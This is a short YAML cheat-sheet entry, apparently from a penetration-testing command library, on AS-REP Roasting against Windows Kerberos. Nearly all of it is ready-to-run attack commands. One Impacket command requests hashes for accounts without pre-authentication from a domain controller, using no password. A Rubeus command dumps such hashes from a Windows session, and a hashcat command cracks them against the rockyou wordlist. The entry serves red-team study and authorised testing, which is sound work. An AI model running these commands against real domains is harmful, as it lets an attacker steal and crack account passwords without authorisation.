---
description: |
  AS-REP Roasting — extract AS-REP hashes for accounts with Kerberos pre-authentication disabled. Only requires a list of usernames, no credentials needed.
commands:
  - have: Username
    cmd: |
      # Extract AS-REP hashes for users with pre-auth disabled (Impacket)
      impacket-GetNPUsers senshu.sh/ -usersfile users.txt -dc-ip 10.10.10.27 -no-pass -request

      # Rubeus — AS-REP Roast from a Windows session
      .\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

      # Crack AS-REP hashes with hashcat
      hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

      # Note: targets accounts with "Do not require Kerberos preauthentication" enabled
      # Only a username list is needed — no password required
phase:
  - Exploitation
target_os:
  - Windows
services:
  - Kerberos
techniques:
  - AS-REP_Roasting
references:
  - https://github.com/fortra/impacket
  - https://github.com/GhostPack/Rubeus
---
